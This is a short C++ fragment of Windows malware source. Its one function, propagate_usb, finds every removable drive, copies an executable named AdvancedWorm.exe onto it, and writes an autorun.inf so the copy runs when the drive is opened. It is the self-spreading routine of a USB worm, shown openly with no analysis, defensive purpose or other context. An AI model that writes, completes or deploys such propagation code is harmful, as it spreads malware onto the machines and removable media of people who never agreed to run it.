#include <windows.h>
#include <fstream>

void propagate_usb(const std::string &source_path) {
    char drive_letter = 'A';
    for (drive_letter = 'A'; drive_letter <= 'Z'; ++drive_letter) {
        std::string drive = std::string(1, drive_letter) + ":\\";
        if (GetDriveType(drive.c_str()) == DRIVE_REMOVABLE) {
            std::string target_path = drive + "AdvancedWorm.exe";
            CopyFile(source_path.c_str(), target_path.c_str(), FALSE);
            std::ofstream autorun_file(drive + "autorun.inf");
            autorun_file << "[autorun]\nopen=AdvancedWorm.exe\n";
            autorun_file.close();
        }
    }
}
